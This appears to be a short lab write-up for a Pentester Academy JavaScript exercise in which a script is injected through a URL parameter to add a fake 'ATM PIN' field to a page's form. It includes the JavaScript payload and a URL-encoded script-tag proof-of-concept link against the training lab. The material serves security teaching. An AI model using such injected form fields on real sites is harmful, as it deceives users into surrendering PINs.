## Task 4 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/4)</small>

Objectives:

1. Add a new form field called "ATM PIN"

So this is pretty straight forward. We need to create an element and add it to the form.

Using [Document.createElement()](https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement) you can create an element and then with [appendChild](https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild) function you can add it before the submit button.

So the payload goes like this

```js
let ip = document.createElement("input");
ip.name = "atm_pin";
ip.classList.add("input-block-level");
ip.placeholder = "ATM Pin";
ip.type = "text";
document.forms[0].appendChild(ip);
```

This will add the input tag underneath submit button. Since it was not mentioned in the challenge, so this was the beast payload I came up with.

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/4?url=%3Cscript%3Elet%20ip%3Ddocument.createElement%28%22input%22%29%3Bip.name%3D%22atm_pin%22%3Bip.classList.add%28%22input-block-level%22%29%3Bip.placeholder%3D%22ATM%20Pin%22%3Bip.type%3D%22text%22%3Bdocument.forms%5B0%5D.appendChild%28ip%29%3B%3C%2Fscript%3E)
